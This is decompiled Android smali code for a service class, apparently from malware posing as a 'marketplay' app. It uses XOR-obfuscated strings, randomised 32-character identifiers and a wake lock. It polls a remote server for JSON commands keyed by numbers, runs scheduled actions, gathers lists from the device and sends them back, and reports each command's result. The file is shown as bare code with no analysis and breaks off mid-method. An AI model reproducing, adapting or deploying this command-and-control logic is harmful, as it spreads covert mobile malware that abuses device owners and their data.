.class public Lcom/android/marketplay/app/ServMmm;
.super Landroid/app/IntentService;


# static fields
.field private static final z:[Ljava/lang/String;


# instance fields
.field private a:Landroid/os/PowerManager;

.field private b:Landroid/os/PowerManager$WakeLock;


# direct methods
.method static constructor <clinit>()V
    .locals 12

    const/16 v0, 0x8

    new-array v3, v0, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v1, "C\u001a"

    const/4 v0, -0x1

    move-object v4, v3

    :goto_0
    invoke-virtual {v1}, Ljava/lang/String;->toCharArray()[C

    move-result-object v1

    array-length v5, v1

    const/4 v6, 0x0

    const/4 v7, 0x1

    if-gt v5, v7, :cond_2

    :cond_0
    move-object v7, v1

    move v8, v6

    move v11, v5

    move-object v5, v1

    move v1, v11

    :goto_1
    aget-char v10, v5, v6

    rem-int/lit8 v9, v8, 0x5

    packed-switch v9, :pswitch_data_0

    const/16 v9, 0x21

    :goto_2
    xor-int/2addr v9, v10

    int-to-char v9, v9

    aput-char v9, v5, v6

    add-int/lit8 v6, v8, 0x1

    if-nez v1, :cond_1

    move-object v5, v7

    move v8, v6

    move v6, v1

    goto :goto_1

    :cond_1
    move v5, v1

    move-object v1, v7

    :cond_2
    if-gt v5, v6, :cond_0

    new-instance v5, Ljava/lang/String;

    invoke-direct {v5, v1}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v5}, Ljava/lang/String;->intern()Ljava/lang/String;

    move-result-object v1

    packed-switch v0, :pswitch_data_1

    aput-object v1, v3, v2

    const/4 v2, 0x1

    const-string v1, "6q"

    const/4 v0, 0x0

    move-object v3, v4

    goto :goto_0

    :pswitch_0
    aput-object v1, v3, v2

    const/4 v2, 0x2

    const-string v1, "H\n"

    const/4 v0, 0x1

    move-object v3, v4

    goto :goto_0

    :pswitch_1
    aput-object v1, v3, v2

    const/4 v2, 0x3

    const-string v1, "\u001aU{\\@\u001aNf\u0012\u0001"

    const/4 v0, 0x2

    move-object v3, v4

    goto :goto_0

    :pswitch_2
    aput-object v1, v3, v2

    const/4 v2, 0x4

    const-string v1, "\u0010Tf\\@\u0015V"

    const/4 v0, 0x3

    move-object v3, v4

    goto :goto_0

    :pswitch_3
    aput-object v1, v3, v2

    const/4 v2, 0x5

    const-string v1, "\\r/\rlC\u001fF\u0008\u0004 \u00140E\u000f\\^"

    const/4 v0, 0x4

    move-object v3, v4

    goto :goto_0

    :pswitch_4
    aput-object v1, v3, v2

    const/4 v2, 0x6

    const-string v1, "\tUbMS"

    const/4 v0, 0x5

    move-object v3, v4

    goto :goto_0

    :pswitch_5
    aput-object v1, v3, v2

    const/4 v2, 0x7

    const-string v1, "*_g^H\u001a_"

    const/4 v0, 0x6

    move-object v3, v4

    goto :goto_0

    :pswitch_6
    aput-object v1, v3, v2

    sput-object v4, Lcom/android/marketplay/app/ServMmm;->z:[Ljava/lang/String;

    return-void

    :pswitch_7
    const/16 v9, 0x79

    goto :goto_2

    :pswitch_8
    const/16 v9, 0x3a

    goto :goto_2

    :pswitch_9
    const/16 v9, 0x15

    goto :goto_2

    :pswitch_a
    const/16 v9, 0x28

    goto :goto_2

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_7
        :pswitch_8
        :pswitch_9
        :pswitch_a
    .end packed-switch

    :pswitch_data_1
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
        :pswitch_6
    .end packed-switch
.end method

.method public constructor <init>()V
    .locals 1

    const-string v0, "q"

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    return-void
.end method

.method public static HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr(Landroid/content/Context;)V
    .locals 6

    new-instance v0, Landroid/text/format/Time;

    invoke-direct {v0}, Landroid/text/format/Time;-><init>()V

    invoke-virtual {v0}, Landroid/text/format/Time;->setToNow()V

    new-instance v1, Lcom/android/marketplay/app/LhlDWRfpnecQYzaJmyfVBJtBNhIyYKnm;

    const/4 v2, 0x0

    sget-object v3, Lcom/android/marketplay/app/ServMmm;->z:[Ljava/lang/String;

    const/4 v4, 0x4

    aget-object v3, v3, v4

    sget-object v4, Lcom/android/marketplay/app/ServMmm;->z:[Ljava/lang/String;

    const/4 v5, 0x5

    aget-object v4, v4, v5

    invoke-virtual {v0, v4}, Landroid/text/format/Time;->format(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v1, v2, v3, v0}, Lcom/android/marketplay/app/LhlDWRfpnecQYzaJmyfVBJtBNhIyYKnm;-><init>(ILjava/lang/String;Ljava/lang/String;)V

    const v0, 0x7f030002

    :try_start_0
    invoke-virtual {p0, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, v1}, Lcom/android/marketplay/app/xgQmdrQDOawGhltrwyniJDFqyjEzxThZ;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr(Landroid/content/Context;Ljava/lang/String;Lcom/android/marketplay/app/LhlDWRfpnecQYzaJmyfVBJtBNhIyYKnm;)Ljava/lang/String;

    move-result-object v0

    sget-object v1, Lcom/android/marketplay/app/ServMmm;->z:[Ljava/lang/String;

    const/4 v2, 0x1

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method private a(Landroid/content/Context;Ljava/lang/String;)Lorg/json/JSONObject;
    .locals 3

    const/4 v1, 0x0

    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    const/4 v2, 0x0

    invoke-static {p1, p2, v2}, Lcom/android/marketplay/app/xgQmdrQDOawGhltrwyniJDFqyjEzxThZ;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr(Landroid/content/Context;Ljava/lang/String;Lcom/android/marketplay/app/LhlDWRfpnecQYzaJmyfVBJtBNhIyYKnm;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    new-instance v2, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;

    invoke-direct {v2, p0}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;-><init>(Landroid/content/Context;)V

    const/4 v2, 0x1

    invoke-static {v2}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr(Z)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    new-instance v0, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;

    invoke-direct {v0, p0}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;-><init>(Landroid/content/Context;)V

    const/4 v0, 0x0

    invoke-static {v0}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr(Z)V

    move-object v0, v1

    goto :goto_0
.end method

.method private a()V
    .locals 4

    sget-object v0, Lcom/android/marketplay/app/ServMmm;->z:[Ljava/lang/String;

    const/4 v1, 0x6

    aget-object v0, v0, v1

    invoke-virtual {p0, v0}, Lcom/android/marketplay/app/ServMmm;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    iput-object v0, p0, Lcom/android/marketplay/app/ServMmm;->a:Landroid/os/PowerManager;

    iget-object v0, p0, Lcom/android/marketplay/app/ServMmm;->a:Landroid/os/PowerManager;

    const/4 v1, 0x1

    sget-object v2, Lcom/android/marketplay/app/ServMmm;->z:[Ljava/lang/String;

    const/4 v3, 0x7

    aget-object v2, v2, v3

    invoke-virtual {v0, v1, v2}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v0

    iput-object v0, p0, Lcom/android/marketplay/app/ServMmm;->b:Landroid/os/PowerManager$WakeLock;

    iget-object v0, p0, Lcom/android/marketplay/app/ServMmm;->b:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->acquire()V

    return-void
.end method

.method private a(Ljava/lang/String;Z)V
    .locals 3

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "c"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Lcom/android/marketplay/app/ServMmm;->z:[Ljava/lang/String;

    const/4 v2, 0x0

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->QDnMokrdTFoyPLZyToNYiuMpTdehaMeO(Landroid/content/Context;Ljava/lang/String;)V

    return-void
.end method

.method private a(Lorg/json/JSONObject;)V
    .locals 9

    const/4 v8, 0x2

    const/4 v2, 0x0

    new-instance v0, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;

    invoke-direct {v0, p0}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;-><init>(Landroid/content/Context;)V

    const-string v0, "1"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_1

    :try_start_0
    const-string v0, "1"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v0

    const-string v1, "1"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getBoolean(Ljava/lang/String;)Z

    move-result v1

    invoke-static {v1}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->YrZKkcheugaIkBUkbvzpSvvzKHepOcDW(Z)V

    if-eqz v1, :cond_0

    const-string v1, "2"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getLong(Ljava/lang/String;)J

    move-result-wide v0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    sget-wide v6, Lcom/android/marketplay/app/FsYHfQLHDhuLWkGBgtQznHXVOCHalJuA;->YrZKkcheugaIkBUkbvzpSvvzKHepOcDW:J

    mul-long/2addr v0, v6

    add-long/2addr v0, v4

    invoke-static {v0, v1}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->YrZKkcheugaIkBUkbvzpSvvzKHepOcDW(J)V

    const-string v0, "3"

    invoke-static {}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->LhlDWRfpnecQYzaJmyfVBJtBNhIyYKnm()J

    move-result-wide v4

    const/4 v1, 0x0

    invoke-static {p0, v0, v4, v5, v1}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr(Landroid/content/Context;Ljava/lang/String;JZ)V

    :cond_0
    const-string v0, "1"

    const/4 v1, 0x1

    invoke-direct {p0, v0, v1}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Z)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_d

    :cond_1
    :goto_0
    const-string v0, "2"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_3

    :try_start_1
    const-string v0, "2"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getLong(Ljava/lang/String;)J
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-result-wide v0

    const-wide/16 v4, 0x0

    cmp-long v3, v0, v4

    if-lez v3, :cond_2

    :try_start_2
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    sget-wide v6, Lcom/android/marketplay/app/FsYHfQLHDhuLWkGBgtQznHXVOCHalJuA;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr:J

    mul-long/2addr v0, v6

    add-long/2addr v0, v4

    invoke-static {v0, v1}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr(J)V

    invoke-static {p0}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr(Landroid/content/Context;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :cond_2
    :try_start_3
    const-string v0, "2"

    const/4 v1, 0x1

    invoke-direct {p0, v0, v1}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Z)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    :cond_3
    :goto_1
    const-string v0, "3"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_5

    :try_start_4
    const-string v0, "3"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    move-result-object v0

    :try_start_5
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    if-lez v1, :cond_4

    invoke-static {p0, v0}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->GIhtjalqATrJaQcIYcGWSkWhmXvGgUse(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    :cond_4
    :try_start_6
    const-string v0, "3"

    const/4 v1, 0x1

    invoke-direct {p0, v0, v1}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Z)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3

    :cond_5
    :goto_2
    const-string v0, "9"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_6

    :try_start_7
    const-string v0, "9"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v0

    invoke-static {v0}, Lcom/android/marketplay/app/mYyHCbRClOJYqVsdyKWCyapMaYhMCvLR;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr(Lorg/json/JSONArray;)Ljava/util/List;
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_5

    move-result-object v3

    move v1, v2

    :goto_3
    :try_start_8
    invoke-interface {v3}, Ljava/util/List;->size()I

    move-result v0

    if-lt v1, v0, :cond_f

    const-string v0, "9"

    const/4 v1, 0x1

    invoke-direct {p0, v0, v1}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Z)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_4

    :cond_6
    :goto_4
    const-string v0, "5"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_7

    :try_start_9
    const-string v0, "5"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v0

    invoke-static {v0}, Lcom/android/marketplay/app/XYbjRgFCbpAotryGWVWAZGSskHkmhNgp;->YrZKkcheugaIkBUkbvzpSvvzKHepOcDW(Lorg/json/JSONArray;)Ljava/util/List;

    move-result-object v0

    invoke-static {v0}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr(Ljava/util/List;)Z

    const-string v0, "5"

    const/4 v1, 0x1

    invoke-direct {p0, v0, v1}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Z)V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_e

    :cond_7
    :goto_5
    const-string v0, "7"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_8

    :try_start_a
    const-string v0, "7"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v0

    invoke-static {v0}, Lcom/android/marketplay/app/GIhtjalqATrJaQcIYcGWSkWhmXvGgUse;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr(Lorg/json/JSONArray;)Ljava/util/List;

    move-result-object v0

    invoke-static {v0}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->YrZKkcheugaIkBUkbvzpSvvzKHepOcDW(Ljava/util/List;)Z

    const-string v0, "7"

    const/4 v1, 0x1

    invoke-direct {p0, v0, v1}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Z)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_f

    :cond_8
    :goto_6
    const-string v0, "6"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_a

    :try_start_b
    const-string v0, "6"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getBoolean(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_9

    new-instance v1, Lorg/json/JSONArray;

    invoke-direct {v1}, Lorg/json/JSONArray;-><init>()V

    invoke-static {p0}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->YrZKkcheugaIkBUkbvzpSvvzKHepOcDW(Landroid/content/Context;)Ljava/util/List;
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_7

    move-result-object v3

    move v0, v2

    :goto_7
    :try_start_c
    invoke-interface {v3}, Ljava/util/List;->size()I

    move-result v4

    if-lt v0, v4, :cond_10

    new-instance v0, Ljava/lang/StringBuilder;

    sget-object v3, Lcom/android/marketplay/app/ServMmm;->z:[Ljava/lang/String;

    const/4 v4, 0x3

    aget-object v3, v3, v4

    invoke-direct {v0, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->QDnMokrdTFoyPLZyToNYiuMpTdehaMeO(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_6

    :cond_9
    :try_start_d
    const-string v0, "6"

    const/4 v1, 0x1

    invoke-direct {p0, v0, v1}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Z)V
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_7

    :cond_a
    :goto_8
    const-string v0, "4"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_c

    :try_start_e
    const-string v0, "4"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;

    invoke-direct {v1, p0}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;-><init>(Landroid/content/Context;)V

    invoke-static {v0}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr(Ljava/lang/String;)V

    new-instance v3, Lcom/android/marketplay/app/QDnMokrdTFoyPLZyToNYiuMpTdehaMeO;

    invoke-direct {v3, p0}, Lcom/android/marketplay/app/QDnMokrdTFoyPLZyToNYiuMpTdehaMeO;-><init>(Landroid/content/Context;)V

    invoke-static {p0}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->YrZKkcheugaIkBUkbvzpSvvzKHepOcDW(Landroid/content/Context;)Ljava/util/List;
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_a

    move-result-object v4

    move v1, v2

    :goto_9
    :try_start_f
    invoke-interface {v4}, Ljava/util/List;->size()I
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_8

    move-result v0

    if-lt v1, v0, :cond_11

    :try_start_10
    invoke-interface {v4}, Ljava/util/List;->size()I

    move-result v0

    if-lez v0, :cond_b

    const-string v0, "5"

    sget-wide v4, Lcom/android/marketplay/app/FsYHfQLHDhuLWkGBgtQznHXVOCHalJuA;->YrZKkcheugaIkBUkbvzpSvvzKHepOcDW:J

    const/4 v1, 0x1

    invoke-static {p0, v0, v4, v5, v1}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr(Landroid/content/Context;Ljava/lang/String;JZ)V
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_9

    :cond_b
    :try_start_11
    const-string v0, "4"

    const/4 v1, 0x1

    invoke-direct {p0, v0, v1}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Z)V
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_a

    :cond_c
    :goto_a
    sget-object v0, Lcom/android/marketplay/app/ServMmm;->z:[Ljava/lang/String;

    aget-object v0, v0, v8

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_e

    :try_start_12
    sget-object v0, Lcom/android/marketplay/app/ServMmm;->z:[Ljava/lang/String;

    const/4 v1, 0x2

    aget-object v0, v0, v1

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_c

    move-result-object v0

    if-eqz v0, :cond_d

    :try_start_13
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1

    if-lez v1, :cond_d

    invoke-static {p0, v0}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->XYbjRgFCbpAotryGWVWAZGSskHkmhNgp(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_b

    :cond_d
    :try_start_14
    sget-object v0, Lcom/android/marketplay/app/ServMmm;->z:[Ljava/lang/String;

    const/4 v1, 0x2

    aget-object v0, v0, v1

    const/4 v1, 0x1

    invoke-direct {p0, v0, v1}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Z)V
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_c

    :cond_e
    :goto_b
    return-void

    :catch_0
    move-exception v0

    :try_start_15
    throw v0
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_1

    :catch_1
    move-exception v0

    const-string v0, "2"

    invoke-direct {p0, v0, v2}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Z)V

    goto/16 :goto_1

    :catch_2
    move-exception v0

    :try_start_16
    throw v0
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_3

    :catch_3
    move-exception v0

    const-string v0, "3"

    invoke-direct {p0, v0, v2}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Z)V

    goto/16 :goto_2

    :catch_4
    move-exception v0

    :try_start_17
    throw v0
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_5

    :catch_5
    move-exception v0

    const-string v0, "9"

    invoke-direct {p0, v0, v2}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Z)V

    goto/16 :goto_4

    :catch_6
    move-exception v0

    :try_start_18
    throw v0
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_7

    :catch_7
    move-exception v0

    const-string v0, "6"

    invoke-direct {p0, v0, v2}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Z)V

    goto/16 :goto_8

    :catch_8
    move-exception v0

    :try_start_19
    throw v0
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_9

    :catch_9
    move-exception v0

    :try_start_1a
    throw v0
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_a

    :catch_a
    move-exception v0

    const-string v0, "4"

    invoke-direct {p0, v0, v2}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Z)V

    goto :goto_a

    :catch_b
    move-exception v0

    :try_start_1b
    throw v0
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_c

    :catch_c
    move-exception v0

    sget-object v0, Lcom/android/marketplay/app/ServMmm;->z:[Ljava/lang/String;

    aget-object v0, v0, v8

    invoke-direct {p0, v0, v2}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Z)V

    goto :goto_b

    :catch_d
    move-exception v0

    const-string v0, "1"

    invoke-direct {p0, v0, v2}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Z)V

    goto/16 :goto_0

    :cond_f
    :try_start_1c
    invoke-interface {v3, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/android/marketplay/app/mYyHCbRClOJYqVsdyKWCyapMaYhMCvLR;

    invoke-static {p0, v0}, Lcom/android/marketplay/app/TBKLpnykmkvphddizgOtmpWPoWPlAskT;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr(Landroid/content/Context;Lcom/android/marketplay/app/mYyHCbRClOJYqVsdyKWCyapMaYhMCvLR;)Z
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_1c} :catch_5

    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto/16 :goto_3

    :catch_e
    move-exception v0

    const-string v0, "5"

    invoke-direct {p0, v0, v2}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Z)V

    goto/16 :goto_5

    :catch_f
    move-exception v0

    const-string v0, "7"

    invoke-direct {p0, v0, v2}, Lcom/android/marketplay/app/ServMmm;->a(Ljava/lang/String;Z)V

    goto/16 :goto_6

    :cond_10
    :try_start_1d
    invoke-interface {v3, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v1, v4}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_1d
    .catch Ljava/lang/Exception; {:try_start_1d .. :try_end_1d} :catch_7

    add-int/lit8 v0, v0, 0x1

    goto/16 :goto_7

    :cond_11
    :try_start_1e
    invoke-interface {v4, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-virtual {v3, v0}, Lcom/android/marketplay/app/QDnMokrdTFoyPLZyToNYiuMpTdehaMeO;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr(Ljava/lang/String;)V
    :try_end_1e
    .catch Ljava/lang/Exception; {:try_start_1e .. :try_end_1e} :catch_a

    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto/16 :goto_9
.end method

.method private a(Landroid/content/Context;Lcom/android/marketplay/app/LhlDWRfpnecQYzaJmyfVBJtBNhIyYKnm;Ljava/lang/String;)Z
    .locals 4

    const/4 v0, 0x1

    :try_start_0
    invoke-static {p1, p3, p2}, Lcom/android/marketplay/app/xgQmdrQDOawGhltrwyniJDFqyjEzxThZ;->HkjpWmWtWxfUoCKKTrwZHgcqckesVCNr(Landroid/content/Context;Ljava/lang/String;Lcom/android/marketplay/app/LhlDWRfpnecQYzaJmyfVBJtBNhIyYKnm;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v1

    :try_start_1
    sget-object v2, Lcom/android/marketplay/app/ServMmm;->z:[Ljava/lang/String;

    const/4 v3, 0x1

    aget-object v2, v2, v3

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-result v2

    if-eqz v2, :cond_0

    :goto_0
    return v0

    :catch_0
    move-exception v0

    :try_start_2
    throw v0

